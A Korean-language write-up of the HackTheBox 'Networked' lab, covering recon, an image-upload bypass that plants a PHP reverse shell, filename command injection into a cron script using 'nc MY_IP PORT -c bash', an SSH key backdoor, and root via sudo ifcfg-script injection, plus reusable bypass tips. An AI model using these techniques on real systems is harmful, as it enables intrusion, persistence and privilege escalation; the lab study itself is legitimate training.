# HTB-NETWORKED
```bash
OS: Linux
DATE: 26.09.14
DIFFICULTY: Easy
```

## Recon
**nmap**: 초기 전체 포트 검사와 상세 검사를 진행하여 22(SSH), 80(HTTP), 443(HTTPS) 서비스가 실행 중인 것을 알게 되었다.
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22,80,443 IP
```
이후 80번 포트 HTTP 서비스에 접근했다. 초기 페이지는 새로운 사이트를 만들자는 문구 말고는 별다른 정보를 얻지 못했다.
```txt
Hello mate, we're building the new FaceMash!
Help by funding us and be the new Tyler&Cameron!
Join us at the pool party this Sat to get a glimpse 
```
따라서 ffuf를 통해 웹 디렉토리와 서브도메인을 열거했다.
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -r -c
```
```bash
ffuf -u http://IP/ -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host:FUZZ.IP"
```
열거 결과 서브도메인은 찾지 못했고, **uploads**라는 웹 디렉토리와 **backup**이라는 웹 디렉토리를 발견했다.

## Initial Access
`http://IP/backup`에 들어가보니 **backup.tar** 파일을 얻게 되었다. 따라서 압축을 풀어 **index.php, lib.php, photos.php, upload.php** 파일들을 얻을 수 있었다.
```bash
tar -xvf backup.tar
```
안에 내용들을 살펴보니 웹사이트 소스들이었다. 파일명을 통해 `upload.php` 페이지가 있는 것을 알게 되어 접속을 시도했다. 먼저 테스트 삼아 shell.php 파일을 업로드했지만 실패했다. 따라서 아까 받은 소스코드를 살펴보았다. 코드를 보니 이미지 파일만 업로드받고 그 외에는 막는 코드였고, 최종적으로 파일을 uploads/ 폴더에 저장하는 방식이었다. 하지만 여기에는 두 가지 우회가 가능했다.

>1. 내용 검사(MIME)가 앞부분만 본다. 파일 앞부분만 보기 때문에 GIF89a를 붙여 놓으면 finfo는 GIF로 인식하고 통과시킨다.
```php
if (!(check_file_type($_FILES["myFile"]) && ...))
```
>2. 확장자 검사와 저장 로직이 서로 다르다. 파일 이름을 검사하는 방식과 실제로 저장할 이름을 만드는 방식이 다르다. 아래 코드는 파일 이름이 특정 확장자로 끝나는지만 보기 때문에, 앞에 .php가 있어도 상관하지 않는다.
```php
$validext = array('.jpg', '.png', '.gif', '.jpeg');
foreach ($validext as $vext) {
  if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
    $valid = true;
  }
}
```
따라서 **shell.php.jpg**라는 파일을 만들고 안에 GIF89a로 시작하는 쉘을 작성했다.
```bash
nano shell.php.jpg
```
```php
GIF89a
<?php
  // php-reverse-shell - A Reverse Shell implementation in PHP
  // Copyright (C) 2007 pentestmonkey@pentestmonkey.net
...
>
```
이후 이 쉘을 /upload.php에서 올려주고 /photos.php에 가보니 대기하고 있던 리스닝에서 초기 Apache 쉘을 얻을 수 있었다.
![apache](attach_real/Pasted%20image%2020260915180422.png)
쉘을 얻고 guly라는 유저 디렉토리에 들어가보니 user flag를 읽거나 다른 기능을 실행할 수 없었다. 하지만 디렉토리 안에 **crontab.guly**와 **check_attack.php**라는 파일이 있었다. crontab 파일부터 읽어보면 `/home/guly/check_attack.php`가 cron으로 실행된다는 내용이었고, check_attack.php를 읽어보니 이 스크립트가 검사하는 폴더가 `/var/www/html/uploads/`라는 것을 알 수 있었다.
```php
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
        $msg='';
  if ($value == 'index.html') {
        continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```
이 스크립트는 scandir이 uploads 폴더의 파일 목록을 가져오고, foreach가 하나씩 돌면서 각 파일 이름을 $value에 담는다. 즉 $value는 폴더 안 파일 하나의 이름이고, 내가 원하는 값을 파일 이름으로 지정할 수 있었다. check_ip는 파일 이름에서 뽑은 $name이 유효한 IP인지 검사하고, 아니면 아래 코드들을 실행한다. 여기서 가장 취약한 코드는 **exec()**, 즉 리눅스 터미널에서 명령을 실행하는 함수였다. $value가 이스케이프 없이 exec에 들어가기 때문에, $value가 `;whoami`라면 whoami 명령을 실행하게 된다. 이 스크립트는 guly 유저로 실행되기 때문에, `/var/www/html/uploads` 폴더의 파일 이름을 커맨드 인젝션 형식으로 저장하면 guly 권한으로 cron이 실행된다는 것이다. 따라서 파일 이름을 `fdjksjf;nc MY_IP PORT -c bash`로 설정하고 리스닝을 켜둔 결과 guly 쉘을 얻을 수 있었다.
```bash
touch dkjdfjdk;nc MY_IP PORT -c bash
```
하지만 쉘 자체가 불안정하여 SSH로 쉽게 접근하기 위해 백도어를 심어주었다.
```bash
(Kali)
ssh-keygen -t rsa -f /tmp/networked
```
```bash
(Target)
mkdir -p ~/.ssh
chmod 700 ~/.ssh
```
```bash
(Target)
echo "/tmp/networked.pub key........" > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
```bash
(Kali)
ssh -i /tmp/networked guly@IP
```
따라서 guly 쉘 접근에 성공했다.
![user](attach_real/Pasted%20image%2020260915125223.png)

## Privilege Escalation
첫 쉘을 따고 나서 `sudo -l`을 확인해보니 NOPASSWD로 `/usr/local/sbin/changename.sh` bash 스크립트가 있었다. 확인해보니 `/etc/sysconfig/network-scripts/ifcfg-guly` 파일에 사용자에게 물어봤던 네 가지 값들을 채워 넣고, 마지막에 그 인터페이스를 켜는 스크립트였다.
```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
        echo "interface $var:"
        read x
        while [[ ! $x =~ $regexp ]]; do
                echo "wrong input, try again"
                echo "interface $var:"
                read x
        done
        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```
**1번째 취약점**: `regexp="^[a-zA-Z0-9_\ /-]+$"` 정규식이 공백을 허용한다. $x가 이 정규식에 맞아야 통과하고 맞지 않으면 "wrong input"을 내며 다시 물어본다. 특수문자는 다 막았지만 공백을 허용했기 때문에 명령을 실행할 수 있었다.

**2번째 취약점**: ifup이 설정 파일을 실행한다. 내가 입력한 값이 ifcfg-guly 파일에 써지고, 마지막에 그 파일을 사용하기 때문에 값을 인젝션하면 root 권한으로 실행할 수 있었다. 따라서 공백으로 쉘을 띄우기를 시도했다. bash는 `변수이름=값 명령어` 형태로 실행되기 때문에, NAME을 물어보면 `test bash`라고 입력하면 bash가 실행되는 커맨드 인젝션 취약점이 있었다. 그리고 `#!/bin/bash -p` 스크립트 맨 첫 줄의 `-p`는 권한을 낮추지 않는다는 플래그이기 때문에 바로 root로 업그레이드가 가능했다.
```bash
sudo /usr/local/sbin/changename.sh
interface NAME:
testy bash
interface PROXY_METHOD:
tj
interface BROWSER_ONLY:
tj
interface BOOTPROTO:
tj
[root@networked network-scripts]# 
```
따라서 권한 상승에 성공했다.
![root](attach_real/Pasted%20image%2020260915132359.png)

## New Inform
- tar: 파일들을 묶거나 푸는 명령어. c: 묶기, x: 풀기, t: list, f: 파일 이름 지정(필수), v: 진행 과정 출력, z: gzip 압축, j: bzip2 압축
- 업로드가 나오면 .php.jpg, GIF89a 쉘을 시도하자.
- 이미지 확장자 순서가 반대일 수도 있다. .php.jpg든 .jpg.php든 둘 다 시도하자.
- 공백 이슈를 항상 염두에 두자.
- ~/.ssh 폴더 권한은 700, authorized_keys는 600.
- **read x**: 값을 입력받는다.
- **/etc/sysconfig/network-scripts/**: 리눅스에서 네트워크 인터페이스 설정을 저장하는 폴더. ifcfg-로 시작하는 파일들이 네트워크 인터페이스 설정을 담는다.
- **ifup**: 네트워크 인터페이스를 켜는 명령어.
- =~: 정규식으로 검사하는 bash 연산자.
- 정규식: 문자열이 어떤 패턴을 따르는지 검사하는 규칙.
- ^(맨 앞): 문자열의 시작. [](대괄호): 이 안에 있는 문자들 중 하나. a-zA-Z0-9_\/-(대괄호 안의 내용): 소문자, 대문자, 숫자, 언더스코어, **\ **이게 공백, /슬래시, -하이픈. +(대괄호 뒤): 앞의 것이 1개 이상. $(맨 끝): 문자열의 끝.
- 정규식에서 []대괄호는 허용 목록. [^]처럼 대괄호 안에 ^를 넣으면 해당 문자들을 금지한다는 뜻. ^이 대괄호 밖이면 허용, 안이면 금지.
- source: 일반적인 bash는 스크립트 안에서 새로운 프로세스를 열고 실행하지만, source는 파일 내용을 현재 쉘에 반영한다.